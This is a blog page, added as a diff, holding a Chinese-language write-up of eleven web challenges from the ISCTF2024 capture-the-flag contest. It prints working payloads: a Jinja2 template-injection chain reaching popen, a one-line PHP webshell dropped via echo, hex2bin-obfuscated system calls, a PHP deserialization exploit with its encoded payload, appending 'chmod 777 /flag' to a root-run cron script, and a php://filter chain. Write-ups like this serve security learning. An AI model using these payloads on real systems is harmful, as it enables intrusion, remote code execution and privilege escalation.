@@ -1,0 +1,534 @@
+
+<!DOCTYPE html>
+<html lang="zh_CN">
+<head>
+    <meta charset="utf-8" />
+    <title>WP For ISCTF2024 WEB | Tremseの部屋</title>
+    <meta name="author" content="Tremse" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>TREMSEの部屋</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;TREMSEの部屋</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>WP For ISCTF2024 WEB</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/11/18
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Web/" style="color: #00a596">
+                    Web
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        
+    <div id="toc">
+        <strong class="sidebar-title">&nbsp&nbsp&nbsp&nbsp目录</strong>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wp-for-isctf2024"><span class="toc-text">wp for isctf2024</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#125%E6%97%B6%E6%99%93%E5%B1%B1%E7%91%9E%E5%B8%8C%E7%94%9F%E6%97%A5%E4%BC%9A"><span class="toc-text">1.25时晓山瑞希生日会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9"><span class="toc-text">2.小蓝鲨的冒险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3ezssti"><span class="toc-text">3.ezssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4upuploader"><span class="toc-text">4.UP!UPloader！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#51z_php"><span class="toc-text">5.1z_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6ezserialize"><span class="toc-text">6.ezserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7ezrce"><span class="toc-text">7.ezrce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-text">8.小蓝鲨的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E5%A4%A9%E5%91%BD%E4%BA%BA"><span class="toc-text">9.天命人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E4%B8%B4%E6%97%B6%E5%AD%98%E5%82%A8%E5%AE%A4"><span class="toc-text">10.小蓝鲨的临时存储室</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%E5%8D%83%E5%B9%B4%E6%A8%B1"><span class="toc-text">11.千年樱</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E6%83%B3%E6%B3%95"><span class="toc-text">最后的一点点想法</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+        <h1 id="wp-for-isctf2024"><a href="#wp-for-isctf2024" class="headerlink" title="wp for isctf2024"></a>wp for isctf2024</h1><h3 id="125时晓山瑞希生日会"><a href="#1-25时晓山瑞希生日会" class="headerlink" title="1.25时晓山瑞希生日会"></a>1.25时晓山瑞希生日会</h3><p>&emsp;&emsp;签到题，考察http请求头相关知识，首先修改user-agent为Project Sekai，再修改X-Forwarded-For为127.0.0.1，最后设置时间为Date: Sun, 27 Aug 2024 05:00:00 GMT。</p>
+<h3 id="2小蓝鲨的冒险"><a href="#2-小蓝鲨的冒险" class="headerlink" title="2.小蓝鲨的冒险"></a>2.小蓝鲨的冒险</h3><p>&emsp;&emsp;签到题，考察php各种特性。先利用<span style="font-family:'Cascadia Code';color:#6faf9f">@parse_str($b);</span>语句，传入<span style="font-family:'Cascadia Code';color:#6faf9f">b&#x3D;a[0]&#x3D;MMHUWUV</span>满足第一个条件。再post将num设为03750(8进制2024)。最后设定which为flag即可。</p>
+<h3 id="3ezssti"><a href="#3-ezssti" class="headerlink" title="3.ezssti"></a>3.ezssti</h3><p>&emsp;&emsp;PYssti,对于我来说算是新题。这里直接给出payload</p>
+<pre><code class="POST_data">user_input=\&#123;\&#123;&#39;&#39;|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|
+attr(request.values.name4)(137)|attr (request.values.name5)|attr(request.values.name6)|
+attr(request.values.name7)(&#39;popen&#39;)(request.values.rce)|attr(request.values.name8)()\&#125;\&#125;
+&amp;name1=\_\_class\_\_&amp;name2=\_\_base\_\_&amp;name3=\_\_subclasses\_\_&amp;name4=pop&amp;name5=\_\_init\_\_
+&amp;name6=\_\_globals\_\_&amp;name7=get&amp;rce=cat /flag&amp;name8=read
+</code></pre>
+<p>&emsp;&emsp;利用<span style="font-family:'Cascadia Code';color:#6faf9f">|attr(request.values.namex)</span>的形式绕过_和[]的过滤，利用__class__.__base__来获取字符串类的基类，再用__subclasses__来获取其子类，在里边找到可以利用的类，这里是os._wrap_close类，用pop给他弹出来(拿到)，然后得到他的globals属性用popen执行rce，再read出来。</p>
+<h3 id="4upuploader"><a href="#4-UP-UPloader！" class="headerlink" title="4.UP!UPloader！"></a>4.UP!UPloader！</h3><p>&emsp;&emsp;文件包含题，上传一个马来rce就行。难点(<em>当然，对于我而言&#x1F634;</em>)在于想到通过include.php中包含文件的机制，通过phpfilter伪协议来获取其他php的源码，只要获得源码，就能知晓其文件上传的。拿到shell之后还要点经验，因为flag不是存在文件里的，而是存在环境里的，要用env命令调出来。<br>两个考点:</p>
+<ul>
+<li>灵活运用各种伪代码，不能太套路化</li>
+<li>找不到东西？上环境看看吧。(有时候robots.txt也是个不错的选择)</li>
+</ul>
+<blockquote>
+<p>经验丰富的重要性就体现出来了,所以要多多做题呀。</p>
+</blockquote>
+<h3 id="51z_php"><a href="#5-1z-php" class="headerlink" title="5.1z_php"></a>5.1z_php</h3><p>&emsp;&emsp;rce题(说真的，几乎每题都是rce了)。源码给了，过滤了<span style="font-family:'Cascadia Code';color:#6faf9f">[‘cat’, ‘tac’, ‘head’, ‘nl’, ‘more’, ‘less’, ‘tail’, ‘vi’, ‘sed’, ‘od’]</span>这些个命令。只要<span style="font-family:'Cascadia Code';color:#6faf9f">J&#x3D;echo ‘&lt;?php @system($_GET[“x”]); ?&gt;‘ &gt; a.php</span>就可以打一个马进去，然后就好办了。</p>
+<blockquote>
+<p>不过也可以用其他一些读文件的命令，详细参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12431?time__1311=GqGxRQ0%3DqWwxlrzG7bGOIGCIYKGK%3DN3x">这里.</a><br>其实这样更快呢，可能rce题做的多了，就一直rce了…</p>
+</blockquote>
+<h3 id="6ezserialize"><a href="#6-ezserialize" class="headerlink" title="6.ezserialize"></a>6.ezserialize</h3><p>&emsp;&emsp;没难度的反序列化(反序列化算是基础题了吧&#x1F60B;),直接给pl罢。</p>
+<pre><code class="PHP">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:3:&quot;tre&quot;;s:7:&quot;isAdmin&quot;;b:1;&#125;
+</code></pre>
+<h3 id="7ezrce"><a href="#7-ezrce" class="headerlink" title="7.ezrce"></a>7.ezrce</h3><p>&emsp;&emsp;rce题。可惜的是刚刚我去尝试复现，结果发现啥命令都没回显了(各种wp都试了试，大概是环境已经关闭了&#x1F972;)。这里给出我印象里的pl:</p>
+<pre><code class="GET_data">cmd=(sy.(st).em)(hex2bin(&quot;636174202f666c6167&quot;)) //这里的hex是“cat /flag”
+</code></pre>
+<p>&emsp;&emsp;利用.连接system，用hex2bin函数来绕过各种过滤。其实这么一想，不如把system也扔到hex2bin里更好。</p>
+<blockquote>
+<p>hex2bin真的超级好用啊，只要这个函数没有被过滤，基本上就是啥都能用&#x1F917;</p>
+</blockquote>
+<h3 id="8小蓝鲨的秘密"><a href="#8-小蓝鲨的秘密" class="headerlink" title="8.小蓝鲨的秘密"></a>8.小蓝鲨的秘密</h3><p>&emsp;&emsp;不好定性的题目，我觉得更像misc了(<del>缘分到了自然而然就出了</del>)。进靶机，结果直接到了小蓝鲨科技的官网去了，那大概是重定向了，现在得把靶机本身的url扒出来。在竞赛平台f12，检查元素获得url，拿burp抓个包，repeater给服务器发请求，响应包里就是flag。<br>&emsp;&emsp;感觉比起其他很多题，这题技术含量真的不大，但是过的人没有那么多，感觉明年hgame-mini也可以出这么一道,至少很有趣呀。</p>
+<blockquote>
+<p>也是拿了个二血，开心开心~&#x1F917;</p>
+</blockquote>
+<h3 id="9天命人"><a href="#9-天命人" class="headerlink" title="9.天命人"></a>9.天命人</h3><p>&emsp;&emsp;反序列化题。本来还算常规的一道题，因为中文的缘故卡了好久(真正原因不太明了，大概是编码的问题，这题报错又没回显)<br>以下是源码：</p>
+<pre><code class="PHP">&lt;?php
+error_reporting(0);
+
+# 帮天命人搜集法宝，重获齐天之姿！
+class Wuzhishan&#123;
+    public $wu=&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;;
+    public $zhi;
+    public $shan;
+
+    function __get($j)
+    &#123;
+        echo &quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;;
+        $yin=&quot;s214587387a&quot;;
+        $yang=$_GET[&#39;J&#39;];
+        if (md5($yin)==$yang&amp;&amp;md5($yin)==md5($yang))&#123;
+            echo &quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;;
+            system(&#39;cat /flag&#39;);
+        &#125;
+    &#125;
+&#125;
+class Huoyanjinjing&#123;
+    public $huoyan;
+    public $jinjing;
+    function __get($huo)
+    &#123;
+        $this-&gt;huoyan=&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;;
+        echo $this-&gt;huoyan-&gt;jinjing;
+    &#125;
+    function __invoke()
+    &#123;
+        $this-&gt;jinjing=&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;;
+        echo $this-&gt;huoyan-&gt;jinjing;
+    &#125;
+&#125;
+class Dinghaishenzhen&#123;
+    public $Jindou=&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;;
+    public $yun;
+
+    function __toString()
+    &#123;
+        $f=$this-&gt;yun;
+        $f();
+        return &quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;;
+    &#125;
+&#125;
+class Jingdouyun&#123;
+    public $Qishier=72;
+    public $bian=&quot;看俺老孙七十二变！&lt;br&gt;&quot;;
+
+    function __sleep()
+    &#123;
+        echo &quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;;
+        echo new Jindouyun();
+    &#125;
+&#125;
+class Tianmingren &#123;
+    public $tianming;
+    public $ren;
+    function __destruct()
+    &#123;
+        echo &quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;;
+        echo $this-&gt;tianming;
+    &#125;
+&#125;
+$data = unserialize($_POST[&#39;Wukong&#39;]);
+throw new Exception(&#39;开局一根棍，装备全靠打。&#39;);
+?&gt;
+</code></pre>
+<p>以下是exp：</p>
+<pre><code class="PHP">&lt;?php
+error_reporting(0);
+
+# 帮天命人搜集法宝，重获齐天之姿！
+class Wuzhishan&#123;
+    public $wu;
+    public $zhi;
+    public $shan;
+
+    function __get($j)
+    &#123;
+        echo &quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;;
+        $yin=&quot;s214587387a&quot;;
+        $yang=$_GET[&#39;J&#39;]; //0e215962017
+        if (md5($yin)==$yang&amp;&amp;md5($yin)==md5($yang))&#123;
+            echo &quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;;
+            system(&#39;cat /flag&#39;);
+        &#125;
+    &#125;
+&#125;
+class Huoyanjinjing&#123;
+    public $huoyan;
+    public $jinjing;
+    function __get($huo) 
+    &#123;
+        $this-&gt;huoyan=&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;;
+        echo $this-&gt;huoyan-&gt;jinjing;
+    &#125;
+    function __invoke()
+    &#123;
+        $this-&gt;jinjing=&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;;
+        echo $this-&gt;huoyan-&gt;jinjing;            //触发wuzhishan
+    &#125;
+&#125;
+class Dinghaishenzhen&#123;
+    public $Jindou;
+    public $yun;
+
+    function __toString()
+    &#123;
+        $f=$this-&gt;yun;
+        $f();                 // 可以触发huoyanjinjing
+        return &quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;;
+    &#125;
+&#125;
+class Jingdouyun&#123;
+    public $Qishier=72;
+    public $bian=&quot;看俺老孙七十二变！&lt;br&gt;&quot;;
+
+    function __sleep()
+    &#123;
+        echo &quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;;
+        echo new Jindouyun();
+    &#125;
+&#125;
+class Tianmingren &#123;
+    public $tianming;
+    public $ren;
+    function __destruct()
+    &#123;
+        echo &#39;迷途中的羔羊，你相信天命吗？&lt;br&gt;&#39;;
+        echo $this-&gt;tianming;
+    &#125;
+&#125;
+
+$a = New Tianmingren();
+$b = new Wuzhishan();
+$c = new Huoyanjinjing();
+$d = new Dinghaishenzhen();
+$a-&gt;ren = $d;
+$a-&gt;tianming = $a-&gt;ren;
+$d-&gt;yun = $c;
+$c-&gt;huoyan = $b;
+
+echo urlencode(serialize($a));
+?&gt;
+</code></pre>
+<blockquote>
+<p>注意要把源码里的中文字符串赋值语句删掉，否则会卡在第一个链节。</p>
+</blockquote>
+<p>以下是pl：</p>
+<pre><code class="PHP">O%3A11%3A%22Tianmingren%22%3A2%3A%7Bs%3A8%3A%22tianming%22%3BO%3A15%3A%22Dinghaishenzhen%22%3A2%3A%7Bs%3A6%3A%22Jindou%22%3BN%3Bs%3A3%3A%22yun%22%3BO%3A13%3A%22Huoyanjinjing%22%3A2%3A%7Bs%3A6%3A%22huoyan%22%3BO%3A9%3A%22Wuzhishan%22%3A3%3A%7Bs%3A2%3A%22wu%22%3BN%3Bs%3A3%3A%22zhi%22%3BN%3Bs%3A4%3A%22shan%22%3BN%3B%7Ds%3A7%3A%22jinjing%22%3BN%3B%7D%7Ds%3A3%3A%22ren%22%3Br%3A2%3B%7D
+</code></pre>
+<h3 id="10小蓝鲨的临时存储室"><a href="#10-小蓝鲨的临时存储室" class="headerlink" title="10.小蓝鲨的临时存储室"></a>10.小蓝鲨的临时存储室</h3><p>&emsp;&emsp;rce题，于我而言也是认识linux很多东西的好题一道。打个马很容易，但是进了靶机文件目录，准备cat flag的时候才发现不成，一看权限，只有root可读可改，那其实这题给我误导到提权好久，感谢mufeng05大佬的指导，才知道没那么麻烦&#x1FAE1;<br>&emsp;&emsp;最主要是要意识到这个定时发生的sh（所以web手要对一些动态的反应敏感些呢），它会定时删去我们上传的php文件，所以我们把马打进去运行shell的时候，经常会出现404，这就是这个.sh文件搞的鬼。当然，我们也可以利用它。它就在根目录里:</p>
+<pre><code>#!/bin/bash find /var/www/localhost/htdocs/uploads/ -type f -name &quot;*.php&quot; -exec rm -f &#123;&#125; \;
+</code></pre>
+<p>&emsp;&emsp;执行ls -l &#x2F;down_file.sh,发现我们对他是有修改权限的。从内容看到它是使用bin&#x2F;bash的，具有root权限，那么我们就可以追加修改&#x2F;flag的权限了.<br>最后的pl如下:</p>
+<pre><code class="GET_data">x=echo &quot;chmod 777 /flag;&quot; &gt;&gt;/down_file.sh
+</code></pre>
+<p>然后就畅通无阻啦~</p>
+<h3 id="11千年樱"><a href="#11-千年樱" class="headerlink" title="11.千年樱"></a>11.千年樱</h3><p>&emsp;&emsp;php综合题(是我这次做的题里感觉含金量比较高的了)。首先是cookie伪造，比较常规<br>源码:</p>
+<pre><code class="PHP">&lt;?php
+include &quot;dir.php&quot;;
+highlight_file(__FILE__);
+
+echo &quot;proof of work&lt;br&gt;&quot;;
+
+if($_COOKIE[&#39;from&#39;] === &quot;ISCTF&quot;)&#123;
+    echo $dir1;
+&#125;
+else&#123;
+    die(&#39;what? so where are you from?&#39;);
+&#125;
+
+// &lt;!-- do you want to learn more?  goto story.txt --&gt;
+?&gt;
+</code></pre>
+<p>&emsp;&emsp;只要令cookie:from&#x3D;ISCTF就可以，得到下一个问题的php:</p>
+<pre><code class="PHP">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;read! read! read!&lt;/title&gt;
+&lt;/head&gt;
+&lt;body style=&quot;background: &#39;/static/bg1.png&#39; &quot;&gt;
+    &lt;?php
+    include &quot;dir.php&quot;;
+    highlight_file(__FILE__);
+
+    if(file_get_contents($_POST[&#39;name&#39;]) === &#39;ISCTF&#39;)&#123;
+        echo $dir2;
+    &#125;
+    else&#123;
+        die(&quot;Wrong!&quot;);
+    &#125;
+
+
+    ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>&emsp;&emsp;这里要一个ISCTF，却是要由file_get_contents获取，那么第一时间就会想到用伪协议搞点事情，刚好data伪协议可以做到造一个字符串出来，那么这里的pl就是这样的了:</p>
+<pre><code class="POST_data">name=data://text/plain,ISCTF
+</code></pre>
+<p>&emsp;&emsp;来到最后一个问题，源码如下:</p>
+<pre><code class="PHP">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;read! read! read! we need read!!!&lt;/title&gt;
+&lt;/head&gt;
+&lt;body style=&quot;background-image: url(&#39;/static/bg2.png&#39;); background-size: cover; background-attachment: fixed; &quot;&gt;
+    &lt;?php
+    include &quot;dir.php&quot;;
+    highlight_file(__FILE__);
+
+    function waf($str)&#123;
+        if(preg_match(&quot;/http|php|file|:|=|\/|\?/i&quot;, $str) )&#123;
+            die(&#39;bad hacker!!!&#39;);
+        &#125;
+    &#125;
+    $poc = $_POST[&#39;poc&#39;]; 
+    waf($poc);
+    $filename = &quot;php://filter/$poc/resource=/var/www/html/badChar.txt&quot;;
+    $result = file_get_contents($filename);
+    if($result === &quot;sakura for ISCTF&quot;)&#123;
+        echo &quot;yes! master!&quot;;
+        eval($_POST[&#39;cmd&#39;]);
+    &#125;
+
+    if($_GET[&#39;output&#39;] == 114514 &amp;&amp; !is_numeric($_GET[&#39;output&#39;]))&#123;
+        var_dump($result);
+    &#125; //well_down_mlpnkobji.php
+
+
+    ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>&emsp;&emsp;这下好了，我们的输入只能限制于php filter协议里的过滤器了。这个时候就要用到神奇的phpfilter链哩~</p>
+<blockquote>
+<p>这个神奇的链子的知识准备在另一篇笔记里写，这里就带过啦<br>&emsp;&emsp;我们可以用神奇的php_filter_chain_generator工具构造filter链，</p>
+</blockquote>
+<pre><code class="CMD">python php_filter_chain_generator.py --chain sakura for ISCTF&lt;?php
+</code></pre>
+<p>&emsp;&emsp;特别注意这个&lt;?php,这是因为我们的工具构造链所得出的字符串除了目标字符串还会有很多冗余(垃圾数据),而php fileter中有一个过滤器，<br>string.strip_tags,它可以删去字符串中html和php标签，也就是说，我们只要在生成的链子末尾加上这个过滤器，就可以把后边的冗余全部删去，得到的字符串就非常纯净了。</p>
+<blockquote>
+<p>这里要感谢mysid佬和mufeng05佬~</p>
+</blockquote>
+<h4 id="最后的一点点想法"><a href="#最后的一点点想法" class="headerlink" title="最后的一点点想法"></a>最后的一点点想法</h4><p>&emsp;&emsp;ISCTF只有一周的时间，但确实是学到了很多东西啊，ctf果然是得积累好多经验，知识面也是广的离谱，总之之后的路大概还挺长的。<br>&emsp;&emsp;<del>但它真的会上瘾啊！ctf，嘿嘿，我的ctf，我的web，斯哈斯哈</del>&#x1F92A;</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+<link rel="stylesheet" href="/css/toc.css" />
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Tremseの部屋
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Tremse
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
